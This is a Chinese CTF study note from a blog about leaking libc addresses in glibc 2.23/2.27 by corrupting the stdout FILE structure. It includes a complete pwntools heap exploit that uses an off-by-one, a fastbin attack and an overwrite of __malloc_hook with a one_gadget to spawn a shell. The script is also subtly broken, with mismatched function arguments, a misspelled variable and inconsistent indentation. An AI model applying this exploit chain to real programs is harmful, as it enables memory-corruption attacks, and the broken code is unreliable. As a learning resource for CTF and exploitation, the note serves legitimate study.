---
layout:     post
title:      IO_FILE泄露libc地址学习笔记
subtitle:   笔记
date:       2020-11-14
author:     X1ng
header-img: IO_FILE泄露libc.jpg
catalog: true
tags:

    - 学习笔记
    - pwn

---

由于做过的题太少了（太菜了），很多时候就算知道某个套路题，调试写出exp也很慢，平时不做题到比赛时已经把知识点忘光了，水篇笔记让我比赛的时候快速回忆IO_FILE泄露libc的知识点

## 利用方法

其实就是修改stdout的flag位为`0xfbad1800`,并且将`_IO_write_base`的最后一个字节改小，输出一些内容，这些内容里面一般都包含libc地址，具体的原理网上都可以找到讲的很好的师傅，可以看看[这个师傅的博客](https://n0va-scy.github.io/2019/09/21/IO_FILE/)

### 在libc-2.23.so下

构造堆块重叠时，需要让一块内存先进入0x70大小的fastbin中，然后再让它进入unsortbin中，然后修改unsortedbin下留下的`main_arena+88`地址

![](https://tva1.sinaimg.cn/large/0081Kckwly1gkp2s5in4hj30jy080gn4.jpg)

用pwntools的send函数发送数据来覆盖最后两字节为`\xdd\xN5`（_IO_2_1_stdout_结构体的地址的最低2字节），N需要爆破1/16

可以用`p &_IO_2_1_stdout_`来查看stdout结构体的地址，实际上应该是比`main_arena+88`大了0x1000左右，比如上图在调试的时候可以用gdb的`set`命令将fd修改为0x7f8d780af5dd，方便调试

从fastbin里malloc两次之后就可以将chunk分配到`_IO_2_1_stdout_`结构体之前的一个地方，因为这段内存中的数据为`0xNNNNNNNNNNNNNNNN 0xNNNNNNNN0000007f`，可以绕过fastbin分配的时候对size的检查

然后填充payload：`'A'*0x33 + p64(0xfbad1800) + p64(0)*3 + b'\x00'`

接收libc中的地址：`leak = u64(ru("\x7f")[-6:].ljust(8,b'\x00'))`

如果有libc文件也可以用偏移直接算出libc基址

```python
IO_stderr = u64(ru("\x7f")[-6:].ljust(8,b'\x00'))-192
libc_base = IO_stderr - libc.symbols['_IO_2_1_stderr_']
```

就完成了泄露

举个利用的栗子

```python
#!/usr/bin/python2

from pwn import *
import sys

context.log_level = 'debug'
context.arch='amd64'

local=1
binary_name='pwn'

libc_name='libc-2.23.so'


def z(a=''):
    if local:
        gdb.attach(p,a)
        if a=='':
            raw_input
    else:
        pass
ru=lambda x:p.recvuntil(x)
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sa=lambda a,b:p.sendafter(a,b)
sla=lambda a,b:p.sendlineafter(a,b)
ia=lambda :p.interactive()
def leak_address():
    if(context.arch=='i386'):
        return u32(p.recv(4))
    else :
        return u64(p.recv(6).ljust(8,b'\x00'))

def cho(num):
    sla(">> ",str(num))

def add(size):
    cho(1)
    sla("size?",str(size))

def edit(idx,con):
    cho(4)
    sla("index ?",str(idx))
    sa("content ?", con)

def delete(idx):
    cho(2)
    sla("index ?",str(idx))

while True:
	try:
		if local:
    		p=process("./"+binary_name)
   			e=ELF("./"+binary_name)
				libc=ELF("./"+libc_name)
		else:
    		p=remote('',)
    		e=ELF("./"+binary_name)
    		ibc=ELF("./"+libc_name)
        
		add(0x18)#0
    
		add(0xf8)
		add(0x68)
		add(0x18)
		edit(0,'a'*0x18+'\x71')
		delete(1)
		#off-by-one，构造堆块重叠
    
		delete(2)
		#将目标chunk放入fastbin
    
		add(0xf8)#1，让fastbin中chunk的fd中保存main_arena+88
    
		add(0x58)#2，与fastbin中重叠
    
		
		edit(2,'\xdd\x25')
		#修改低位两字节
		
		add(0x68)#4
    
		add(0x68)#5，该chunk在`_IO_2_1_stdout_`结构体附近
		
		edit(5,'a'*0x33 + p64(0xfbad1800) + p64(0)*3 + '\x00')
		#填充payload
    
		IO_stderr = u64(ru("\x7f")[-6:].ljust(8,'\x00'))-192
		libc_base = IO_stderr - libc.symbols['_IO_2_1_stderr_']
		print 'libc:' + hex(libc_base)
		malloc_hook = libc_base + libc.symbols['__malloc_hook']
		print 'malloc:' + hex(malloc_hook-0x10)
		#接收地址
    
		add(0x18)#6
    
		add(0xf8)
		add(0x68)
		add(0x18)
		edit(6,'a'*0x18+'\x71')
		delete(7)
		delete(8)
		add(0x168)#7
    
		edit(7,'a'*0xf0+p64(0)+p64(0x71)+p64(malloc_hook - 0x23))
		#故技重施，分配chunk到malloc_hook附近
    
		add(0x68,'b')#8
    
		add(0x68,'b')#10
    
		edit(10,'\x00'*0x13 + p64(libc_base + 0x45226))
		#填充payload，覆盖malloc_hook为one_gadget
    
		cho(1)
		sla("size?",str(100))
		#调用malloc		
    
		ia()
		break
	except:
		p.close()

```



### 在libc-2.27.so下

在libc-2.27环境下由于有了tcache，不需要特意将chunk分配到内存中的数据为`0xNNNNNNNNNNNNNNNN 0xNNNNNNNN0000007f`的地址上了，直接把tcache的fd改为`_IO_2_1_stdout_`即可

而且tcache可以直接覆盖free hook为system函数进行利用

